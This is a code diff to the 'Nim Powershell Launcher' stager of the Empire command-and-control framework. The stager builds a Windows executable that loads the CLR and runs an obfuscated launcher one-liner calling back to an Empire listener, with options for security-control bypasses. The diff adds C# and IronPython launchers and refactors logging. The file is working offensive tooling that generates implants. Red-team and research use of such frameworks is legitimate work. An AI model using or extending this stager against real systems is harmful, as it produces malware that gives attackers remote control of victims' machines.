@@ -1,9 +1,12 @@
 from __future__ import print_function
 
+import logging
 import os
 from builtins import object
 
 from empire.server.common import helpers
+
+log = logging.getLogger(__name__)
 
 
 class Stager(object):
@@ -11,20 +14,23 @@ class Stager(object):
 
         self.info = {
             "Name": "Nim Powershell Launcher",
-            "Author": ["@hubbl3"],
+            "Authors": [
+                {
+                    "Name": "Jake Krasnov",
+                    "Handle": "@hubbl3",
+                    "Link": "https://twitter.com/_Hubbl3",
+                }
+            ],
             "Description": "Generate an unmanaged binary that loads the CLR and executes a powershell one liner",
             "Comments": ["Based on the work of @bytebl33d3r"],
         }
 
-        # any options needed by the stager, settable during runtime
         self.options = {
-            # format:
-            #   value_name : {description, required, default_value}
             "Language": {
                 "Description": "Language of the stager to generate.",
                 "Required": True,
                 "Value": "powershell",
-                "SuggestedValues": ["powershell"],
+                "SuggestedValues": ["powershell", "ironpython", "csharp"],
                 "Strict": True,
             },
             "Listener": {
@@ -76,12 +82,9 @@ class Stager(object):
             },
         }
 
-        # save off a copy of the mainMenu object to access external functionality
-        #   like listeners/agent handlers/etc.
         self.main_menu = main_menu
 
         for param in params:
-            # parameter format is [Name, Value]
             option, value = param
             if option in self.options:
                 self.options[option]["Value"] = value
@@ -97,28 +100,41 @@ class Stager(object):
         listener_name = self.options["Listener"]["Value"]
         stager_retries = self.options["StagerRetries"]["Value"]
 
-        if language.lower() == "powershell":
-            obfuscate = self.options["Obfuscate"]["Value"]
-            obfuscate_command = self.options["ObfuscateCommand"]["Value"]
-            outfile = self.options["OutFile"]["Value"]
+        obfuscate = self.options["Obfuscate"]["Value"]
+        obfuscate_command = self.options["ObfuscateCommand"]["Value"]
+        outfile = self.options["OutFile"]["Value"]
 
-            if not self.main_menu.listeners.is_listener_valid(listener_name):
-                # not a valid listener, return nothing for the script
-                print(helpers.color("[!] Invalid listener: " + listener_name))
+        if (
+            self.main_menu.listenersv2.get_active_listener_by_name(listener_name)
+            is None
+        ):
+            # not a valid listener, return nothing for the script
+            log.error("[!] Invalid listener: " + listener_name)
+            return ""
+        else:
+            obfuscate_script = obfuscate.lower() == "true"
+
+        if language in ["csharp", "ironpython"]:
+            if (
+                self.mainMenu.listenersv2.get_active_listener_by_name(
+                    listener_name
+                ).info["Name"]
+                != "HTTP[S]"
+            ):
+                log.error(
+                    "Only HTTP[S] listeners are supported for C# and IronPython stagers."
+                )
                 return ""
-            else:
-                obfuscate_script = False
-                if obfuscate.lower() == "true":
-                    obfuscate_script = True
 
-                if obfuscate_script and "launcher" in obfuscate_command.lower():
-                    print(
-                        helpers.color(
-                            "[!] if using obfuscation, LAUNCHER obfuscation cannot be used in the dll stager."
-                        )
-                    )
-                    return ""
+            launcher = self.mainMenu.stagers.generate_exe_oneliner(
+                language=language,
+                obfuscate=obfuscate_script,
+                obfuscation_command=obfuscate_command,
+                encode=False,
+                listener_name=listener_name,
+            )
 
+        elif language == "powershell":
             launcher = self.main_menu.stagers.generate_launcher(
                 listener_name,
                 language=language,
@@ -129,36 +145,40 @@ class Stager(object):
                 stagerRetries=stager_retries,
                 bypasses=self.options["Bypasses"]["Value"],
             )
+        else:
+            log.error("[!] Invalid launcher language.")
+            return ""
 
-            if launcher == "":
-                print(helpers.color("[!] Error in launcher command generation."))
-                return ""
-
-            else:
-                # Generate nim launcher from template
-                nim_source = open(
-                    self.main_menu.installPath
-                    + "/data/module_source/nim/execute_powershell_bin.nim",
-                    "rb",
-                ).read()
-                nim_source = nim_source.decode("UTF-8")
-                nim_source = nim_source.replace("{{ script }}", launcher)
-                file = open("/tmp/launcher.nim", "w")
-                file.write(nim_source)
-                file.close()
-                currdir = os.getcwd()
-                os.chdir("/tmp/")
-                os.system("nim c -d=mingw --app=console --cpu=amd64 launcher.nim")
-                os.chdir(currdir)
-                os.remove("/tmp/launcher.nim")
-
-                # Create exe and send to client
-                directory = "/tmp/launcher.exe"
-                f = open(directory, "rb")
-                code = f.read()
-                f.close()
-                return code
+        if launcher == "":
+            log.error("[!] Error in launcher command generation.")
+            return ""
 
         else:
-            print(helpers.color("[!] Invalid launcher language."))
-            return ""
+            # Generate nim launcher from template
+            with open(
+                self.main_menu.installPath
+                + "/data/module_source/nim/execute_powershell_bin.nim",
+                "rb",
+            ) as f:
+                nim_source = f.read()
+            nim_source = nim_source.decode("UTF-8")
+            nim_source = nim_source.replace("{{ script }}", launcher)
+            with open("/tmp/launcher.nim", "w") as f:
+                f.write(nim_source)
+
+            currdir = os.getcwd()
+            os.chdir("/tmp/")
+            os.system("nim c -d=mingw --app=console --cpu=amd64 launcher.nim")
+            os.chdir(currdir)
+            os.remove("/tmp/launcher.nim")
+
+            # Create exe and send to client
+            directory = "/tmp/launcher.exe"
+
+            try:
+                with open(directory, "rb") as f:
+                    code = f.read()
+                return code
+            except IOError:
+                log.error("Could not read file at " + str(directory))
+                return ""
